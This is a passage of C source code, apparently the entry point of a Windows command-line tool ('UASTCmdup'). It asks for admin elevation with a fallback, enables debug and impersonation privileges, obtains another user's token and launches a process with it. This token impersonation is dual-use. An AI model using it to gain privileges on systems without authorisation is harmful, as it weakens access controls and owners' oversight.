            if (TrSetLanguage(p)) {
                WCHAR buf[128];
                swprintf_s(buf, 128, Tr(L"cli.lang.switched"), p);
                Log(L"%s\n", buf);
                return 0;
            }
            else {
                WCHAR buf[128];
                swprintf_s(buf, 128, Tr(L"cli.lang.not_found"), p);
                Log(L"%s\n", buf);
                Log(L"%s\n", Tr(L"cli.lang.use_help"));
                return 1;
            }
        }
    }
    return -1;
}

static int RunMain(int argc, wchar_t** argv)
{
    ParsedCmdLine parsed;
    WCHAR selfPath[MAX_PATH] = { 0 };
    WCHAR jsonPath[MAX_PATH] = { 0 };
    WCHAR originalArgs[MAX_PATH * 4] = { 0 };
    WCHAR errBuf[512] = { 0 };
    HANDLE hToken = NULL;
    BOOL ok;
    int i;
    int langRet;

    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    {
        WCHAR* slash = wcsrchr(selfPath, L'\\');
        if (slash) {
            *(slash + 1) = L'\0';
            swprintf_s(jsonPath, MAX_PATH, L"%slanguage.json", selfPath);
        }
    }

    InitConsole();
    TrInit(jsonPath);

    /* 处理 -language 参数 */
    langRet = HandleLanguageArg(argc, argv);
    if (langRet >= 0) {
        TrShutdown();
        return langRet;
    }

    ZeroMemory(&parsed, sizeof(parsed));
    parsed.valid = TRUE;
    if (argc > 1) parsed = ParseCommandLine(argc, argv);

    NotifyParentIfNeeded();

    Log(L"==========================================\n");
    {
        WCHAR b[256];
        swprintf_s(b, 256, Tr(L"cli.banner"), APP_VERSION);
        Log(L"%s\n", b);
    }
    Log(L"==========================================\n\n");

    TRF("cli.self_path", selfPath);

    if (parsed.showVersion) {
        Log(L"UASTCmdup %s\n", APP_VERSION);
        TrShutdown();
        return 0;
    }
    if (parsed.showHelp) {
        Log(L"%s\n", Tr(L"cli.lang.help"));
        TrShutdown();
        return 0;
    }
    if (!parsed.valid) {
        TRF("cli.err_unknown_opt", parsed.errorMsg);
        TrShutdown();
        return 1;
    }
    if (!parsed.options.target[0]) {
        TR("cli.no_target");
        TR("cli.use_help");
        TrShutdown();
        return 1;
    }

    if (!IsCurrentProcessAdmin()) {
        TR("cli.elevate");

        for (i = 1; i < argc; i++) {
            if (i > 1) wcscat_s(originalArgs, _countof(originalArgs), L" ");
            wcscat_s(originalArgs, _countof(originalArgs), argv[i]);
        }

        if (TryElevateWithFallback(originalArgs, selfPath)) {
            TR("cli.triggered");
            TrShutdown();
            return 0;
        }
        TR("cli.all_failed");
        TrShutdown();
        return 1;
    }

    TR("cli.already_admin");

    EnablePrivilege(SE_DEBUG_NAME);
    EnablePrivilege(SE_IMPERSONATE_NAME);
    EnablePrivilege(SE_INC_BASE_PRIORITY_NAME);

    TRF("cli.get_token", parsed.options.userMode);
    hToken = GetTargetToken(parsed.options.userMode, errBuf, _countof(errBuf));
    if (!hToken) {
        Log(L"[!] %s\n", errBuf);
        TrShutdown();
        return 1;
    }
    TR("cli.token_got");

    AdjustTokenForOptions(hToken, &parsed.options);
    TR("cli.create_proc");

    ok = ExecuteWithToken(hToken, &parsed.options, errBuf, _countof(errBuf));
    CloseHandle(hToken);

    if (!ok) {
        Log(L"[!] %s\n", errBuf);
        TrShutdown();
        return 1;
    }

    TR("cli.done");
    TrShutdown();
    return 0;
}

/* ============================================================================
 * 入口
 * ============================================================================ */

int wmain(int argc, wchar_t** argv)
{
    int ret = RunMain(argc, argv);
    PauseOnError(ret);
    return ret;
}